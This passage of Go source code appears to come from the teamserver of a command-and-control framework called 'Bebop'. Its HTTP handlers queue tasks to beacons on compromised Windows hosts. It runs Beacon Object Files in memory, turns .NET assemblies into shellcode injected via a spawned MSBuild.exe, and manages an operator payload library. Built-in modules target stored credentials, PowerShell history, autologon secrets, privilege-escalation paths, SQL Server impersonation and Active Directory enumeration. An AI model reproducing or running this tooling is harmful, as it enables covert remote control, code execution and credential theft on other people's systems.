		return protocol.InlineModeDirect, "direct", nil
	default:
		return 0, "", fmt.Errorf("invalid mode %q", raw)
	}
}

func loadInlineAssemblyLoaderBOFBytes() ([]byte, error) {
	candidates := []string{
		filepath.Join("resources", "InlineAssembly.Loader.x64.obj"),
		filepath.Join("..", "resources", "InlineAssembly.Loader.x64.obj"),
		filepath.Join("teamserver", "resources", "InlineAssembly.Loader.x64.obj"),
		filepath.Join("..", "teamserver", "resources", "InlineAssembly.Loader.x64.obj"),
		filepath.Join("..", "..", "teamserver", "resources", "InlineAssembly.Loader.x64.obj"),
		filepath.Join("modules", "inline-assembly", "InlineAssembly.Loader.x64.obj"),
		filepath.Join("..", "modules", "inline-assembly", "InlineAssembly.Loader.x64.obj"),
		filepath.Join("..", "..", "modules", "inline-assembly", "InlineAssembly.Loader.x64.obj"),
	}
	var lastErr error
	for _, path := range candidates {
		data, err := os.ReadFile(path)
		if err == nil && len(data) > 0 {
			return data, nil
		}
		if err != nil {
			lastErr = err
		}
	}
	if lastErr != nil {
		return nil, lastErr
	}
	return nil, fmt.Errorf("inline-assembly BOF loader not found")
}

func loadManagedBridgeBytes() ([]byte, error) {
	candidates := []string{
		filepath.Join("resources", "Runtime.Loader.dll"),
		filepath.Join("..", "resources", "Runtime.Loader.dll"),
		filepath.Join("teamserver", "resources", "Runtime.Loader.dll"),
		filepath.Join("..", "teamserver", "resources", "Runtime.Loader.dll"),
		filepath.Join("..", "..", "teamserver", "resources", "Runtime.Loader.dll"),
		filepath.Join("managed-bridge", "Bebop.ManagedBridge", "bin", "Release", "Runtime.Loader.dll"),
		filepath.Join("..", "managed-bridge", "Bebop.ManagedBridge", "bin", "Release", "Runtime.Loader.dll"),
		filepath.Join("..", "..", "managed-bridge", "Bebop.ManagedBridge", "bin", "Release", "Runtime.Loader.dll"),
		filepath.Join("managed-bridge", "Bebop.ManagedBridge", "bin", "Release", "Bebop.ManagedBridge.dll"),
		filepath.Join("..", "managed-bridge", "Bebop.ManagedBridge", "bin", "Release", "Bebop.ManagedBridge.dll"),
		filepath.Join("..", "..", "managed-bridge", "Bebop.ManagedBridge", "bin", "Release", "Bebop.ManagedBridge.dll"),
	}
	var lastErr error
	for _, path := range candidates {
		data, err := os.ReadFile(path)
		if err == nil && len(data) > 0 {
			return data, nil
		}
		if err != nil {
			lastErr = err
		}
	}
	if lastErr != nil {
		return nil, lastErr
	}
	return nil, fmt.Errorf("managed bridge not found")
}

func (h *Handler) requireBeaconFromMultipart(r *http.Request) (uint32, *models.Beacon, error) {
	beaconIDStr := strings.TrimSpace(r.FormValue("beacon_id"))
	if beaconIDStr == "" {
		return 0, nil, fmt.Errorf("missing beacon_id")
	}
	beaconIDVal, err := strconv.ParseUint(beaconIDStr, 10, 32)
	if err != nil {
		return 0, nil, fmt.Errorf("invalid beacon_id")
	}
	beaconID := uint32(beaconIDVal)
	beacon := h.store.GetBeacon(beaconID)
	if beacon == nil {
		return 0, nil, fmt.Errorf("unknown beacon")
	}
	return beaconID, beacon, nil
}

func (h *Handler) readInlineAssemblySource(r *http.Request) ([]byte, error) {
	file, _, err := r.FormFile("assembly")
	if err == nil {
		defer file.Close()
		assemblyBytes, readErr := readFormFileLimited(file, maxInlineAssemblyFileBytes)
		if readErr != nil {
			if errors.Is(readErr, errFileTooLarge) {
				return nil, fmt.Errorf("assembly too large")
			}
			return nil, fmt.Errorf("read error")
		}
		return assemblyBytes, nil
	}
	if !errors.Is(err, http.ErrMissingFile) {
		return nil, fmt.Errorf("read error")
	}

	name := r.FormValue("assembly_name")
	if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
		return nil, fmt.Errorf("missing assembly file or invalid assembly_name")
	}
	assemblyBytes, readErr := os.ReadFile(filepath.Join(h.assemblyDir(), name))
	if readErr != nil {
		if os.IsNotExist(readErr) {
			return nil, fmt.Errorf("assembly not found in library: %s", name)
		}
		return nil, fmt.Errorf("read error")
	}
	if int64(len(assemblyBytes)) > maxInlineAssemblyFileBytes {
		return nil, fmt.Errorf("assembly too large")
	}
	return assemblyBytes, nil
}

func (h *Handler) queueTaskWithSessionFastPath(beaconID uint32, task *models.Task) {
	if h.sessionListener != nil && h.store.IsSession(beaconID) {
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:       task.Type,
			Code:       task.Code,
			Flags:      task.Flags,
			Label:      task.Label,
			Identifier: task.Identifier,
			Length:     uint32(len(task.Data)),
		})
		taskMsg = append(taskMsg, task.Data...)
		if err := h.sessionListener.SendTask(beaconID, taskMsg); err == nil {
			task.Status = models.TaskStatusSent
		}
	}
	h.store.QueueTask(task)
}

func (h *Handler) HandleInlineAssembly(w http.ResponseWriter, r *http.Request) {
	if err := parseMultipartLimited(w, r, maxInlineAssemblyBodyBytes); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}
	defer cleanupMultipart(r)

	beaconID, beacon, err := h.requireBeaconFromMultipart(r)
	if err != nil {
		status := http.StatusBadRequest
		if err.Error() == "unknown beacon" {
			status = http.StatusNotFound
		}
		http.Error(w, err.Error(), status)
		return
	}
	if beacon.Platform != 2 || beacon.Arch != 1 {
		http.Error(w, "inline-assembly is supported only for Windows x64 beacons", http.StatusBadRequest)
		return
	}

	mode, modeName, err := resolveInlineMode(r.FormValue("mode"))
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	if mode == protocol.InlineModeDirect {
		http.Error(w, "direct mode removed; inline-assembly now requires bridge mode", http.StatusBadRequest)
		return
	}

	args, err := parseWindowsArgLine(r.FormValue("args"))
	if err != nil {
		http.Error(w, "invalid args: "+err.Error(), http.StatusBadRequest)
		return
	}

	assemblyBytes, err := h.readInlineAssemblySource(r)
	if err != nil {
		status := http.StatusBadRequest
		if strings.HasPrefix(err.Error(), "assembly not found in library: ") {
			status = http.StatusNotFound
		} else if err.Error() == "assembly too large" {
			status = http.StatusRequestEntityTooLarge
		}
		http.Error(w, err.Error(), status)
		return
	}

	bridgeBytes, err := loadManagedBridgeBytes()
	if err != nil {
		http.Error(w, "managed bridge unavailable; install dotnet SDK 8.0+ and rerun setup-teamserver.sh", http.StatusInternalServerError)
		return
	}
	loaderObj, err := loadInlineAssemblyLoaderBOFBytes()
	if err != nil {
		http.Error(w, "inline-assembly BOF loader unavailable; rerun setup-teamserver.sh", http.StatusInternalServerError)
		return
	}
	if !isCOFFAMD64(loaderObj) {
		http.Error(w, "inline-assembly BOF loader is not x64 COFF", http.StatusInternalServerError)
		return
	}

	inlineArgs := protocol.EncodeInlineAssemblyBOFArgs(bridgeBytes, assemblyBytes, args)
	payload := protocol.EncodeBOFReq(loaderObj, inlineArgs)

	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])

	task := &models.Task{
		Label:      label,
		BeaconID:   beaconID,
		Type:       protocol.TaskBOF,
		Code:       protocol.CodeBOF,
		Identifier: inlineAssemblyBOFIdentifier,
		Data:       payload,
		Status:     models.TaskStatusPending,
		CreatedAt:  time.Now(),
	}
	h.queueTaskWithSessionFastPath(beaconID, task)

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("inline-assembly", fmt.Sprintf("operator '%s' queued inline-assembly via BOF for #%d (%d bytes)", op, beaconID, len(assemblyBytes)))

	json.NewEncoder(w).Encode(map[string]interface{}{
		"label":       label,
		"status":      "queued",
		"mode":        modeName,
		"bridge_used": true,
		"task_type":   protocol.TaskBOF,
	})
}

func isCOFFAMD64(obj []byte) bool {
	if len(obj) < 20 {
		return false
	}
	return binary.LittleEndian.Uint16(obj[:2]) == 0x8664
}

func isBOFObjectFilename(name string) bool {
	ext := strings.ToLower(filepath.Ext(name))
	return ext == ".o" || ext == ".obj"
}

func libraryKindForName(name string) (string, error) {
	ext := strings.ToLower(filepath.Ext(name))
	switch ext {
	case ".o", ".obj":
		return "bof", nil
	case ".exe":
		return "assembly", nil
	default:
		return "", fmt.Errorf("unsupported library file extension")
	}
}

func safeLibraryName(name string) (string, error) {
	name = strings.TrimSpace(name)
	if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
		return "", fmt.Errorf("invalid name")
	}
	return name, nil
}

func (h *Handler) libraryRootDir() string {
	if configured := strings.TrimSpace(os.Getenv("BEBOP_LIBRARY_DIR")); configured != "" {
		os.MkdirAll(configured, 0700)
		return configured
	}
	home, _ := os.UserHomeDir()
	dir := filepath.Join(home, ".bebop")
	os.MkdirAll(dir, 0700)
	return dir
}

func (h *Handler) bofDir() string {
	dir := filepath.Join(h.libraryRootDir(), "bofs")
	os.MkdirAll(dir, 0700)
	return dir
}

func (h *Handler) libraryDirForKind(kind string) string {
	if kind == "bof" {
		return h.bofDir()
	}
	return h.assemblyDir()
}

func libraryEntryFromFile(kind, name, dir string) (models.LibraryEntry, error) {
	info, err := os.Stat(filepath.Join(dir, name))
	if err != nil {
		return models.LibraryEntry{}, err
	}
	return models.LibraryEntry{
		Name:      name,
		File:      name,
		Kind:      kind,
		Source:    "operator",
		Deletable: true,
		Size:      info.Size(),
		UpdatedAt: info.ModTime(),
	}, nil
}

func (h *Handler) builtinBOFDir() string {
	if configured := strings.TrimSpace(os.Getenv("BEBOP_BUILTIN_BOF_DIR")); configured != "" {
		return configured
	}
	candidates := []string{
		filepath.Join("teamserver", "resources", "bofs"),
		filepath.Join("resources", "bofs"),
		filepath.Join("..", "teamserver", "resources", "bofs"),
	}
	for _, dir := range candidates {
		if _, err := os.Stat(filepath.Join(dir, "manifest.json")); err == nil {
			return dir
		}
	}
	return filepath.Join("teamserver", "resources", "bofs")
}

func (h *Handler) loadBuiltinBOFs() []models.LibraryEntry {
	dir := h.builtinBOFDir()
	raw, err := os.ReadFile(filepath.Join(dir, "manifest.json"))
	if err != nil {
		return nil
	}
	var manifest []models.LibraryEntry
	if err := json.Unmarshal(raw, &manifest); err != nil {
		return nil
	}
	var out []models.LibraryEntry
	for _, entry := range manifest {
		entry.Name = strings.TrimSpace(entry.Name)
		entry.File = strings.TrimSpace(entry.File)
		if entry.File == "" {
			entry.File = entry.Name
		}
		if _, err := safeLibraryName(entry.Name); err != nil {
			continue
		}
		if _, err := safeLibraryName(entry.File); err != nil {
			continue
		}
		if !isBOFObjectFilename(entry.File) {
			continue
		}
		info, err := os.Stat(filepath.Join(dir, entry.File))
		if err != nil || info.IsDir() {
			continue
		}
		entry.Kind = "bof"
		entry.Source = "builtin"
		entry.Deletable = false
		entry.Size = info.Size()
		entry.UpdatedAt = info.ModTime()
		out = append(out, entry)
	}
	return out
}

func (h *Handler) readBuiltinBOF(name string) ([]byte, string, bool, error) {
	for _, entry := range h.loadBuiltinBOFs() {
		if name != entry.Name && name != entry.File {
			continue
		}
		obj, err := os.ReadFile(filepath.Join(h.builtinBOFDir(), entry.File))
		if err != nil {
			return nil, "", true, fmt.Errorf("read error")
		}
		if int64(len(obj)) > maxBOFFileBytes {
			return nil, "", true, errFileTooLarge
		}
		return obj, entry.Name, true, nil
	}
	return nil, "", false, nil
}

func (h *Handler) hasBuiltinBOF(name string) bool {
	for _, entry := range h.loadBuiltinBOFs() {
		if name == entry.Name || name == entry.File {
			return true
		}
	}
	return false
}

func (h *Handler) ListLibraryFiles() []models.LibraryEntry {
	out := h.loadBuiltinBOFs()
	for _, group := range []struct {
		kind string
		dir  string
	}{
		{kind: "assembly", dir: h.assemblyDir()},
		{kind: "bof", dir: h.bofDir()},
	} {
		entries, _ := os.ReadDir(group.dir)
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			kind, err := libraryKindForName(name)
			if err != nil || kind != group.kind {
				continue
			}
			entry, err := libraryEntryFromFile(group.kind, name, group.dir)
			if err == nil {
				out = append(out, entry)
			}
		}
	}
	if out == nil {
		return []models.LibraryEntry{}
	}
	return out
}

func (h *Handler) readBOFSource(r *http.Request) ([]byte, string, error) {
	if name := strings.TrimSpace(r.FormValue("object_name")); name != "" {
		safeName, err := safeLibraryName(name)
		if err != nil {
			return nil, "", err
		}
		kind, err := libraryKindForName(safeName)
		if err == nil && kind == "bof" {
			obj, err := os.ReadFile(filepath.Join(h.bofDir(), safeName))
			if err == nil {
				if int64(len(obj)) > maxBOFFileBytes {
					return nil, "", errFileTooLarge
				}
				return obj, safeName, nil
			}
			if err != nil && !os.IsNotExist(err) {
				return nil, "", fmt.Errorf("read error")
			}
		}
		if obj, resolvedName, found, err := h.readBuiltinBOF(safeName); found {
			if err != nil {
				return nil, "", err
			}
			return obj, resolvedName, nil
		}
		if err != nil {
			return nil, "", fmt.Errorf("object not found in library or builtin BOFs: %s", safeName)
		}
		return nil, "", fmt.Errorf("object not found in library: %s", safeName)
	}

	file, header, err := r.FormFile("object")
	if err != nil {
		return nil, "", fmt.Errorf("missing object file")
	}
	defer file.Close()
	if header == nil || !isBOFObjectFilename(header.Filename) {
		return nil, "", fmt.Errorf("object file must use .o or .obj extension")
	}
	obj, err := readFormFileLimited(file, maxBOFFileBytes)
	if err != nil {
		return nil, "", err
	}
	return obj, header.Filename, nil
}

func packBOFArgs(args []string) []byte {
	var b []byte
	for _, arg := range args {
		var lenBuf [4]byte
		binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(arg)))
		b = append(b, lenBuf[:]...)
		b = append(b, []byte(arg)...)
	}
	return b
}

func packBOFStringArg(b []byte, value string) []byte {
	var lenBuf [4]byte
	binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(value)+1))
	b = append(b, lenBuf[:]...)
	b = append(b, []byte(value)...)
	return append(b, 0)
}

func packBOFWideStringArg(b []byte, value string) []byte {
	var lenBuf [4]byte
	encoded := utf16.Encode([]rune(value))
	binary.LittleEndian.PutUint32(lenBuf[:], uint32((len(encoded)+1)*2))
	b = append(b, lenBuf[:]...)
	for _, r := range encoded {
		var u [2]byte
		binary.LittleEndian.PutUint16(u[:], r)
		b = append(b, u[:]...)
	}
	return append(b, 0, 0)
}

func packBOFIntArg(b []byte, value int) []byte {
	var out [4]byte
	binary.LittleEndian.PutUint32(out[:], uint32(value))
	return append(b, out[:]...)
}

func packBuiltinWideOptional(name string, tokens []string) ([]byte, error) {
	if len(tokens) > 1 {
		return nil, fmt.Errorf("%s accepts at most one argument", name)
	}
	value := ""
	if len(tokens) == 1 {
		value = tokens[0]
	}
	return packBOFWideStringArg(nil, value), nil
}

func packBuiltinNoArgs(name string, tokens []string) ([]byte, error) {
	if len(tokens) != 0 {
		return nil, fmt.Errorf("%s does not accept arguments", name)
	}
	return nil, nil
}

func packBuiltinFixedStrings(name string, tokens []string, minArgs, maxArgs int) ([]byte, error) {
	if len(tokens) < minArgs || len(tokens) > maxArgs {
		if minArgs == maxArgs {
			return nil, fmt.Errorf("%s requires %d argument(s)", name, minArgs)
		}
		return nil, fmt.Errorf("%s requires %d-%d argument(s)", name, minArgs, maxArgs)
	}
	var b []byte
	for i := 0; i < maxArgs; i++ {
		value := ""
		if i < len(tokens) {
			value = tokens[i]
		}
		b = packBOFStringArg(b, value)
	}
	return b, nil
}

func packBuiltinXPipeArgs(tokens []string) ([]byte, error) {
	if len(tokens) > 1 {
		return nil, fmt.Errorf("xpipe accepts at most one argument")
	}
	value := "L"
	if len(tokens) == 1 {
		value = tokens[0]
	}
	return packBOFStringArg(nil, value), nil
}

func packBuiltinSQLArgs(name string, tokens []string) ([]byte, error) {
	switch name {
	case "sql-1434udp":
		return packBuiltinFixedStrings(name, tokens, 1, 1)
	case "sql-info", "sql-impersonate":
		return packBuiltinFixedStrings(name, tokens, 1, 2)
	case "sql-whoami", "sql-links", "sql-users", "sql-databases", "sql-tables", "sql-agentstatus", "sql-checkrpc":
		return packBuiltinFixedStrings(name, tokens, 1, 4)
	case "sql-columns", "sql-rows":
		if len(tokens) < 2 || len(tokens) > 5 {
			return nil, fmt.Errorf("%s requires 2-5 argument(s)", name)
		}
		var b []byte
		server := tokens[0]
		table := tokens[1]
		database := ""
		link := ""
		impersonate := ""
		if len(tokens) > 2 {
			database = tokens[2]
		}
		if len(tokens) > 3 {
			link = tokens[3]
		}
		if len(tokens) > 4 {
			impersonate = tokens[4]
		}
		b = packBOFStringArg(b, server)
		b = packBOFStringArg(b, database)
		b = packBOFStringArg(b, table)
		b = packBOFStringArg(b, link)
		b = packBOFStringArg(b, impersonate)
		return b, nil
	case "sql-search":
		if len(tokens) < 2 || len(tokens) > 5 {
			return nil, fmt.Errorf("sql-search requires 2-5 argument(s)")
		}
		var b []byte
		server := tokens[0]
		keyword := tokens[1]
		database := ""
		link := ""
		impersonate := ""
		if len(tokens) > 2 {
			database = tokens[2]
		}
		if len(tokens) > 3 {
			link = tokens[3]
		}
		if len(tokens) > 4 {
			impersonate = tokens[4]
		}
		b = packBOFStringArg(b, server)
		b = packBOFStringArg(b, database)
		b = packBOFStringArg(b, link)
		b = packBOFStringArg(b, impersonate)
		b = packBOFStringArg(b, keyword)
		return b, nil
	case "sql-query":
		if len(tokens) < 2 || len(tokens) > 5 {
			return nil, fmt.Errorf("sql-query requires 2-5 argument(s)")
		}
		var b []byte
		server := tokens[0]
		query := tokens[1]
		database := ""
		link := ""
		impersonate := ""
		if len(tokens) > 2 {
			database = tokens[2]
		}
		if len(tokens) > 3 {
			link = tokens[3]
		}
		if len(tokens) > 4 {
			impersonate = tokens[4]
		}
		b = packBOFStringArg(b, server)
		b = packBOFStringArg(b, database)
		b = packBOFStringArg(b, link)
		b = packBOFStringArg(b, impersonate)
		b = packBOFStringArg(b, query)
		return b, nil
	default:
		return nil, fmt.Errorf("%s has no SQL argument packer", name)
	}
}

func packBuiltinLDAPSearchArgs(tokens []string) ([]byte, error) {
	if len(tokens) == 0 {
		return nil, fmt.Errorf("ldapsearch requires a query")
	}
	query := tokens[0]
	attributes := "*"
	resultLimit := 0
	scope := 3
	hostname := ""
	dn := ""
	ldaps := 0

	for i := 1; i < len(tokens); i++ {
		token := tokens[i]
		if !strings.HasPrefix(token, "--") {
			if attributes == "*" {
				attributes = token
				continue
			}
			return nil, fmt.Errorf("unexpected ldapsearch argument: %s", token)
		}
		key := strings.TrimPrefix(token, "--")
		value := ""
		if eq := strings.IndexByte(key, '='); eq >= 0 {
			value = key[eq+1:]
			key = key[:eq]
		} else if key != "ldaps" {
			i++
			if i >= len(tokens) {
				return nil, fmt.Errorf("missing value for --%s", key)
			}
			value = tokens[i]
		}

		switch key {
		case "attributes":
			attributes = value
		case "count":
			n, err := strconv.Atoi(value)
			if err != nil || n < 0 {
				return nil, fmt.Errorf("invalid --count value")
			}
			resultLimit = n
		case "scope":
			n, err := strconv.Atoi(value)
			if err != nil || n < 0 {
				return nil, fmt.Errorf("invalid --scope value")
			}
			scope = n
		case "hostname":
			hostname = value
		case "dn":
			dn = value
		case "ldaps":
			ldaps = 1
		default:
			return nil, fmt.Errorf("unknown ldapsearch option: --%s", key)
		}
	}

	var b []byte
	b = packBOFStringArg(b, query)
	b = packBOFStringArg(b, attributes)
	b = packBOFIntArg(b, resultLimit)
	b = packBOFIntArg(b, scope)
	b = packBOFStringArg(b, hostname)
	b = packBOFStringArg(b, dn)
	b = packBOFIntArg(b, ldaps)
	return b, nil
}

func packBuiltinBOFArgs(name, raw string) ([]byte, bool, error) {
	tokens, err := parseWindowsArgLine(raw)
	if err != nil {
		return nil, false, err
	}

	switch name {
	case "adcs_enum", "schtasks-enum", "password-policy":
		args, err := packBuiltinWideOptional(name, tokens)
		return args, true, err
	case "xpipe":
		args, err := packBuiltinXPipeArgs(tokens)
		return args, true, err
	case "msi-search", "safe-harbor",
		"priv-always-install-elevated", "priv-autologon", "priv-credential-manager",
		"priv-hijackable-path", "priv-modifiable-autorun", "priv-modifiable-service",
		"priv-powershell-history", "priv-token-privileges", "priv-uac-status",
		"priv-unquoted-service-path":
		args, err := packBuiltinNoArgs(name, tokens)
		return args, true, err
	case "net-shares":
		wide, err := packBuiltinWideOptional(name, tokens)
		if err != nil {
			return nil, true, err
		}
		return packBOFIntArg(wide, 0), true, nil
	case "netloggedon":
		wide, err := packBuiltinWideOptional(name, tokens)
		if err != nil {
			return nil, true, err
		}
		return packBOFIntArg(wide, 0), true, nil
	case "regsession":
		if len(tokens) > 1 {
			return nil, true, fmt.Errorf("regsession accepts at most one argument")
		}
		value := ""
		if len(tokens) == 1 {
			value = tokens[0]
		}
		return packBOFStringArg(nil, value), true, nil
	case "local-sessions":
		if len(tokens) != 0 {
			return nil, true, fmt.Errorf("local-sessions does not accept arguments")
		}
		return nil, true, nil
	case "ldapsearch":
		args, err := packBuiltinLDAPSearchArgs(tokens)
		return args, true, err
	case "sql-1434udp", "sql-info", "sql-impersonate", "sql-whoami", "sql-links",
		"sql-users", "sql-databases", "sql-tables", "sql-agentstatus",
		"sql-checkrpc", "sql-columns", "sql-rows", "sql-search", "sql-query":
		args, err := packBuiltinSQLArgs(name, tokens)
		return args, true, err
	default:
		return nil, false, nil
	}
}

func (h *Handler) HandleBOF(w http.ResponseWriter, r *http.Request) {
	if err := parseMultipartLimited(w, r, maxBOFBodyBytes); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}
	defer cleanupMultipart(r)

	beaconID, beacon, err := h.requireBeaconFromMultipart(r)
	if err != nil {
		status := http.StatusBadRequest
		if err.Error() == "unknown beacon" {
			status = http.StatusNotFound
		}
		http.Error(w, err.Error(), status)
		return
	}
	if beacon.Platform != 2 || beacon.Arch != 1 {
		http.Error(w, "BOF is supported only for Windows x64 beacons", http.StatusBadRequest)
		return
	}

	obj, objectName, err := h.readBOFSource(r)
	if err != nil {
		if errors.Is(err, errFileTooLarge) {
			http.Error(w, "object too large", http.StatusRequestEntityTooLarge)
			return
		}
		status := http.StatusBadRequest
		if strings.HasPrefix(err.Error(), "object not found in library") {
			status = http.StatusNotFound
		} else if err.Error() == "read error" {
			status = http.StatusInternalServerError
		}
		http.Error(w, err.Error(), status)
		return
	}
	if !isCOFFAMD64(obj) {
		http.Error(w, "object must be x64 COFF", http.StatusBadRequest)
		return
	}

	argBytes, builtinArgs, err := packBuiltinBOFArgs(objectName, r.FormValue("args"))
	if err != nil {
		http.Error(w, "invalid args: "+err.Error(), http.StatusBadRequest)
		return
	}
	if !builtinArgs {
		args, err := parseWindowsArgLine(r.FormValue("args"))
		if err != nil {
			http.Error(w, "invalid args: "+err.Error(), http.StatusBadRequest)
			return
		}
		argBytes = packBOFArgs(args)
	}
	payload := protocol.EncodeBOFReq(obj, argBytes)

	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])

	task := &models.Task{
		Label:     label,
		BeaconID:  beaconID,
		Type:      protocol.TaskBOF,
		Code:      protocol.CodeBOF,
		Data:      payload,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	}
	h.queueTaskWithSessionFastPath(beaconID, task)

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("bof", fmt.Sprintf("operator '%s' queued BOF for #%d: %s (%d bytes)", op, beaconID, objectName, len(obj)))

	json.NewEncoder(w).Encode(map[string]interface{}{
		"label":    label,
		"status":   "queued",
		"name":     objectName,
		"obj_size": len(obj),
	})
}

func (h *Handler) HandleExecAssembly(w http.ResponseWriter, r *http.Request) {
	if err := parseMultipartLimited(w, r, maxAssemblyBodyBytes); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}
	defer cleanupMultipart(r)

	beaconIDStr := r.FormValue("beacon_id")
	beaconIDVal, err := strconv.ParseUint(beaconIDStr, 10, 32)
	if err != nil {
		http.Error(w, "invalid beacon_id", http.StatusBadRequest)
		return
	}
	beaconID := uint32(beaconIDVal)

	if h.store.GetBeacon(beaconID) == nil {
		http.Error(w, "unknown beacon", http.StatusNotFound)
		return
	}

	args := r.FormValue("args")
	spawnto := r.FormValue("spawnto")
	if spawnto == "" {
		spawnto = `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe`
	}

	var assemblyBytes []byte
	file, _, err := r.FormFile("assembly")
	if err == nil {
		defer file.Close()
		assemblyBytes, err = readFormFileLimited(file, maxAssemblyFileBytes)
		if err != nil {
			if errors.Is(err, errFileTooLarge) {
				http.Error(w, "assembly too large", http.StatusRequestEntityTooLarge)
				return
			}
			http.Error(w, "read error", http.StatusInternalServerError)
			return
		}
	} else {
		name := r.FormValue("assembly_name")
		if name == "" || strings.ContainsAny(name, "/\\") || strings.Contains(name, "..") {
			http.Error(w, "missing assembly file or invalid assembly_name", http.StatusBadRequest)
			return
		}
		assemblyBytes, err = os.ReadFile(filepath.Join(h.assemblyDir(), name))
		if err != nil {
			http.Error(w, "assembly not found in library: "+name, http.StatusNotFound)
			return
		}
	}

	shellcode, err := builder.AssemblyToShellcode(assemblyBytes, args)
	if err != nil {
		http.Error(w, "donut conversion failed: "+err.Error(), http.StatusInternalServerError)
		return
	}

	payload := protocol.EncodeExecAssemblyReq(shellcode, spawnto)

	var labelBytes [4]byte
	if _, err := rand.Read(labelBytes[:]); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	label := binary.LittleEndian.Uint32(labelBytes[:])

	task := &models.Task{
		Label:     label,
		BeaconID:  beaconID,
		Type:      protocol.TaskExecAssembly,
		Code:      protocol.CodeExecAssembly,
		Data:      payload,
		Status:    models.TaskStatusPending,
		CreatedAt: time.Now(),
	}

	if h.sessionListener != nil && h.store.IsSession(beaconID) {
		taskMsg := protocol.EncodeHeader(protocol.TaskHeader{
			Type:   protocol.TaskExecAssembly,
			Code:   protocol.CodeExecAssembly,
			Label:  label,
			Length: uint32(len(payload)),
		})
		taskMsg = append(taskMsg, payload...)
		if err := h.sessionListener.SendTask(beaconID, taskMsg); err != nil {
			h.store.QueueTask(task)
		} else {
			task.Status = models.TaskStatusSent
			h.store.QueueTask(task)
		}
	} else {
		h.store.QueueTask(task)
	}

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("exec-assembly", fmt.Sprintf("operator '%s' queued execute-assembly for #%d (%d bytes shellcode)", op, beaconID, len(shellcode)))

	json.NewEncoder(w).Encode(map[string]interface{}{
		"label":   label,
		"status":  "queued",
		"sc_size": len(shellcode),
	})
}

func (h *Handler) assemblyDir() string {
	if configured := strings.TrimSpace(os.Getenv("BEBOP_LIBRARY_DIR")); configured != "" {
		dir := filepath.Join(configured, "assemblies")
		os.MkdirAll(dir, 0700)
		return dir
	}
	home, _ := os.UserHomeDir()
	dir := filepath.Join(home, ".bebop", "assemblies")
	os.MkdirAll(dir, 0700)
	return dir
}

func (h *Handler) HandleLibraryList(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(h.ListLibraryFiles())
}

func (h *Handler) HandleLibraryUpload(w http.ResponseWriter, r *http.Request) {
	if err := parseMultipartLimited(w, r, maxAssemblyBodyBytes); err != nil {
		http.Error(w, "parse error", http.StatusBadRequest)
		return
	}
	defer cleanupMultipart(r)

	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "missing file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	name := strings.TrimSpace(r.FormValue("name"))
	if name == "" && header != nil {
		name = header.Filename
	}
	name, err = safeLibraryName(name)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	kind, err := libraryKindForName(name)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	limit := maxAssemblyFileBytes
	if kind == "bof" {
		limit = maxBOFFileBytes
	}
	data, err := readFormFileLimited(file, limit)
	if err != nil {
		if errors.Is(err, errFileTooLarge) {
			http.Error(w, "file too large", http.StatusRequestEntityTooLarge)
			return
		}
		http.Error(w, "read error", http.StatusInternalServerError)
		return
	}
	if kind == "bof" && !isCOFFAMD64(data) {
		http.Error(w, "object must be x64 COFF", http.StatusBadRequest)
		return
	}

	dir := h.libraryDirForKind(kind)
	if err := os.WriteFile(filepath.Join(dir, name), data, 0600); err != nil {
		http.Error(w, "write error", http.StatusInternalServerError)
		return
	}
	entry, err := libraryEntryFromFile(kind, name, dir)
	if err != nil {
		http.Error(w, "stat error", http.StatusInternalServerError)
		return
	}

	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("library", fmt.Sprintf("operator '%s' uploaded %s: %s (%d bytes)", op, kind, name, len(data)))
	h.hub.Publish("library", "add", entry)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(entry)
}

func (h *Handler) HandleLibraryDelete(w http.ResponseWriter, r *http.Request) {
	name, err := safeLibraryName(r.PathValue("name"))
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	kind, err := libraryKindForName(name)
	if err != nil {
		if h.hasBuiltinBOF(name) {
			http.Error(w, "built-in library entries cannot be deleted", http.StatusForbidden)
			return
		}
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	path := filepath.Join(h.libraryDirForKind(kind), name)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		if h.hasBuiltinBOF(name) {
			http.Error(w, "built-in library entries cannot be deleted", http.StatusForbidden)
			return
		}
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
		http.Error(w, "delete error", http.StatusInternalServerError)
		return
	}
	op, _ := r.Context().Value(operatorKey).(string)
	h.logEvent("library", fmt.Sprintf("operator '%s' deleted %s: %s", op, kind, name))
	h.hub.Publish("library", "delete", map[string]interface{}{"name": name, "kind": kind})
	w.WriteHeader(http.StatusNoContent)
}

func (h *Handler) HandleAssemblyUpload(w http.ResponseWriter, r *http.Request) {
